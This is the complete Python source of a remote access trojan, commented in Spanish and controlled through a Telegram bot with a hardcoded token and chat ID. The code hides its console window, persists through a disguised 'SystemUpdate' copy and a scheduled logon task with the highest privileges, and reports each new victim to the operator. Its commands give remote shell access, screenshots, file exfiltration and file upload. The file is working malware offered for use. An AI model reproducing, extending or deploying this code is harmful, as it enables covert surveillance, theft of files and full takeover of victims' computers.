import os
import subprocess
import platform
import shutil
import time
import tempfile
import win32process
import win32con
import ctypes
import uuid
import json
import requests
from datetime import datetime
from PIL import ImageGrab
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Configuración del bot de Telegram
TOKEN = "8308654980:AAFE8jhMWQDsAHCz0i-6tJhxKR5YZ5yYzA0"
CHAT_ID = "1648349933"

# Variables para controlar el modo shell y sesiones
shell_mode = False
current_chat_id = None
sessions = {}  # Diccionario para almacenar todas las sesiones
current_session = None  # Sesión actualmente seleccionada

# Rutas para persistencia
SESSIONS_FILE = os.path.join(os.getenv("APPDATA"), "sessions.json")  # Archivo para guardar las sesiones
PERSISTENCE_PATH = os.path.join(os.getenv("APPDATA"), "SystemUpdate.py")  # Ruta del script

# Funciones para manejar las sesiones
def load_sessions():
    global sessions
    try:
        if os.path.exists(SESSIONS_FILE):
            with open(SESSIONS_FILE, 'r') as f:
                sessions = json.load(f)
    except Exception as e:
        print(f"Error al cargar sesiones: {e}")

def save_sessions():
    try:
        with open(SESSIONS_FILE, 'w') as f:
            json.dump(sessions, f, indent=4)
    except Exception as e:
        print(f"Error al guardar sesiones: {e}")

# Cargar sesiones al inicio
load_sessions()

# Ruta para persistencia (donde se copiará el script para ejecutarse en segundo plano)
PERSISTENCE_PATH = os.path.join(os.getenv("APPDATA"), "SystemUpdate.py")

# Función para ocultar la ventana de la consola (solo Windows)
def hide_console():
    try:
        import win32console
        import win32gui
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
    except Exception as e:
        print(f"No se pudo ocultar la consola: {e}")

# Función para agregar persistencia (tarea programada en Windows)
def add_persistence():
    try:
        # Copiar el script a una ubicación persistente
        current_script = os.path.abspath(__file__)
        if not os.path.exists(PERSISTENCE_PATH):
            shutil.copyfile(current_script, PERSISTENCE_PATH)
        
        # Crear una tarea programada para ejecutar el script al iniciar Windows
        task_name = "SystemUpdateTask"
        cmd = f'schtasks /create /tn "{task_name}" /tr "python {PERSISTENCE_PATH}" /sc onlogon /rl highest /f'
        subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print("Persistencia agregada con éxito.")
    except Exception as e:
        print(f"Error al agregar persistencia: {e}")

# Función para lanzar el RAT en segundo plano como proceso separado
def launch_background_process():
    try:
        # Configurar el proceso para que sea independiente (DETACHED_PROCESS en Windows)
        if platform.system() == "Windows":
            creationflags = win32process.DETACHED_PROCESS | win32process.CREATE_NO_WINDOW
            subprocess.Popen(
                ["python", os.path.abspath(__file__), "background"],
                creationflags=creationflags,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            print("RAT lanzado en segundo plano. Puedes cerrar esta ventana o presionar Ctrl+C sin afectar el proceso.")
        else:
            # Para Linux/macOS, usar nohup o similar
            subprocess.Popen(
                ["python", os.path.abspath(__file__), "background"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                start_new_session=True
            )
            print("RAT lanzado en segundo plano.")
    except Exception as e:
        print(f"Error al lanzar el proceso en segundo plano: {e}")

# Función para enviar mensajes largos (evitar límites de Telegram)
async def send_long_message(chat_id: int, text: str, bot, max_length=4096):
    if len(text) > max_length:
        for i in range(0, len(text), max_length):
            await bot.send_message(chat_id=chat_id, text=text[i:i+max_length])
    else:
        await bot.send_message(chat_id=chat_id, text=text)

# Función para notificar nueva sesión
async def notify_new_session(bot, session_id, session_info):
    session_msg = (
        f"🔵 Nueva sesión conectada:\n"
        f"ID: {session_id}\n"
        f"Host: {session_info['hostname']}\n"
        f"Usuario: {session_info['username']}\n"
        f"Sistema: {session_info['system']}\n"
        f"Hora: {session_info['start_time']}"
    )
    await bot.send_message(chat_id=CHAT_ID, text=session_msg)

# Comando /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_chat_id, current_session
    if str(update.effective_chat.id) == CHAT_ID:
        current_chat_id = update.effective_chat.id
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Conexión establecida con la víctima")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")

# Función para verificar si hay una sesión seleccionada
async def check_session(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if not current_session:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ No hay sesión seleccionada. Usa /sessions para ver las sesiones disponibles y /select para elegir una."
        )
        return False
    return True

# Comando /cmd - Ejecutar un comando del sistema
async def cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
        return
    
    if not await check_session(update, context):
        return
    if len(context.args) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Uso: /cmd <comando>")
        return
    command = " ".join(context.args)
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        if not output:
            output = "Comando ejecutado, pero sin salida."
        await send_long_message(update.effective_chat.id, f"Resultado:\n{output}", context.bot)
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error al ejecutar el comando: {str(e)}")

# Comando /screenshot - Tomar captura de pantalla
async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
        return
    
    if not await check_session(update, context):
        return
    try:
        screenshot = ImageGrab.grab()
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".png")
        screenshot.save(temp_file.name)
        with open(temp_file.name, 'rb') as photo:
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=photo)
        os.remove(temp_file.name)
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error al tomar captura: {str(e)}")

# Comando /download - Descargar archivo de la víctima
async def download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
        return
    
    if not await check_session(update, context):
        return
    if len(context.args) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Uso: /download <ruta_del_archivo>")
        return
    file_path = " ".join(context.args)
    if os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as file:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=file)
        except Exception as e:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error al enviar archivo: {str(e)}")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Archivo no encontrado")

# Comando /upload - Subir archivo a la víctima
async def upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
        return
    
    if not await check_session(update, context):
        return
    if len(context.args) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Uso: /upload <ruta_destino>")
        return
    context.user_data['upload_path'] = " ".join(context.args)
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Envía el archivo para subir")

# Manejar archivos enviados para /upload
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
        return
    if 'upload_path' not in context.user_data:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Primero usa /upload <ruta_destino>")
        return
    try:
        file = await update.message.document.get_file()
        temp_file = tempfile.NamedTemporaryFile(delete=False)
        await file.download_to_drive(temp_file.name)
        shutil.copy(temp_file.name, context.user_data['upload_path'])
        os.remove(temp_file.name)
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Archivo subido con éxito")
        del context.user_data['upload_path']
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error al subir archivo: {str(e)}")

# Comando /shell - Modo shell interactivo
async def shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global shell_mode
    if str(update.effective_chat.id) != CHAT_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
        return
    
    if not await check_session(update, context):
        return
    shell_mode = True
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Modo shell activado. Escribe 'exit' para salir.")

# Manejar mensajes en modo shell
async def handle_shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global shell_mode
    if str(update.effective_chat.id) != CHAT_ID:
        return
    if shell_mode:
        command = update.message.text
        if command.lower() == 'exit':
            shell_mode = False
            await context.bot.send_message(chat_id=update.effective_chat.id, text="Modo shell desactivado.")
        else:
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                if not output:
                    output = "Comando ejecutado, pero sin salida."
                await send_long_message(update.effective_chat.id, f"Resultado:\n{output}", context.bot)
            except Exception as e:
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error: {str(e)}")

# Comando /sessions - Listar sesiones
async def list_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
        return
    
    load_sessions()  # Cargar sesiones desde el archivo
    
    if not sessions:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="No hay sesiones registradas.")
        return
    
    sessions_msg = "📋 Sesiones disponibles:\n\n"
    for session_id, info in sessions.items():
        selected = "✅" if session_id == current_session else "  "
        sessions_msg += (
            f"{selected} ID: {session_id}\n"
            f"   Host: {info['hostname']}\n"
            f"   Usuario: {info['username']}\n"
            f"   Sistema: {info['system']}\n"
            f"   Inicio: {info['start_time']}\n\n"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=sessions_msg)

# Comando /select - Seleccionar sesión
async def select_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_session
    if str(update.effective_chat.id) != CHAT_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
        return
    
    load_sessions()  # Cargar sesiones desde el archivo
    
    if len(context.args) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Uso: /select <session_id>")
        return
    
    session_id = context.args[0]
    if session_id not in sessions:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ ID de sesión no válido.")
        return
    
    current_session = session_id
    info = sessions[session_id]
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"✅ Sesión seleccionada:\nID: {session_id}\nHost: {info['hostname']}\nUsuario: {info['username']}"
    )

# Comando /info - Información del sistema
async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
        return
    
    if not await check_session(update, context):
        return
    system_info = f"Información del sistema:\n"
    system_info += f"- Usuario: {os.getlogin()}\n"
    system_info += f"- Máquina: {platform.node()}\n"
    system_info += f"- Sistema: {platform.platform()}\n"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=system_info)

# Función para enviar notificación de forma sincrónica
def send_notification(bot, session_id, session_info):
    import requests
    
    session_msg = (
        f"🔵 Nueva sesión conectada:\n"
        f"ID: {session_id}\n"
        f"Host: {session_info['hostname']}\n"
        f"Usuario: {session_info['username']}\n"
        f"Sistema: {session_info['system']}\n"
        f"Hora: {session_info['start_time']}"
    )
    
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": session_msg
    }
    try:
        requests.post(url, json=data)
    except Exception as e:
        print(f"Error al enviar notificación: {e}")

# Configurar la aplicación con reconexión automática
def run_rat():
    # Ocultar consola (solo Windows)
    if platform.system() == "Windows":
        hide_console()
        add_persistence()

    # Crear nueva sesión al iniciar
    session_id = str(uuid.uuid4())[:8]  # Usar los primeros 8 caracteres del UUID
    session_info = {
        'id': session_id,
        'start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'hostname': platform.node(),
        'username': os.getlogin(),
        'system': platform.system()
    }
    
    # Cargar sesiones existentes y agregar la nueva
    load_sessions()
    sessions[session_id] = session_info
    save_sessions()
    
    # Enviar notificación de forma sincrónica antes de iniciar el bot
    send_notification(None, session_id, session_info)

    while True:
        try:
            app = Application.builder().token(TOKEN).build()

            # Registrar manejadores de comandos
            app.add_handler(CommandHandler("start", start))
            app.add_handler(CommandHandler("cmd", cmd))
            app.add_handler(CommandHandler("screenshot", screenshot))
            app.add_handler(CommandHandler("download", download))
            app.add_handler(CommandHandler("upload", upload))
            app.add_handler(CommandHandler("shell", shell))
            app.add_handler(CommandHandler("info", info))
            app.add_handler(CommandHandler("sessions", list_sessions))
            app.add_handler(CommandHandler("select", select_session))
            app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
            app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_shell))

            print("RAT conectado. Esperando comandos...")
            app.run_polling(allowed_updates=Update.ALL_TYPES)
        except Exception as e:
            print(f"Error en la conexión: {e}. Intentando reconectar en 10 segundos...")
            time.sleep(10)  # Esperar antes de intentar reconectar

# Punto de entrada principal
if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "background":
        # Ejecutar el RAT en modo background
        run_rat()
    else:
        # Lanzar el RAT como proceso separado en segundo plano
        launch_background_process()